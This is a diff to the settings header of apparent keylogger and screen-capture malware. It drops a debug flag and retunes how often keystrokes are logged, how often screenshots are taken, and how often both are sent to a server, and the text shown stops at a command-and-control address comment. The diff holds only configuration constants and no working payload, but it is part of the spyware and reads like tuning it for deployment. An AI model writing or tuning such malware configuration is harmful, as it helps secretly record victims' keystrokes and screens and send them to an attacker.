@@ -2,11 +2,6 @@
 #define SETTINGS_H
 
 /**
- * Whether or not to write debug logs
- **/
-#define DEBUG true
-
-/**
  * Name of the master log
  **/
 #define MASTER_LOG_NAME "ml"
@@ -14,18 +9,18 @@
 /**
  * How often the keylog is written in minutes
  **/
-#define LOG_FREQUENCY_MINUTES 0.1
+#define LOG_FREQUENCY_MINUTES 2
 
 /**
  * How often the keylog and screenshots are 
  * dumped to the server in minutes
  */
-#define DUMP_FREQUENCY_MINUTES 0.25
+#define DUMP_FREQUENCY_MINUTES 60
 
 /**
  * How often screenshots are recorded in minutes
  */
-#define SS_FREQUENCY_MINUTES 0.1
+#define SS_FREQUENCY_MINUTES 0.5
 
 /**
  * Comand and Control ip and port
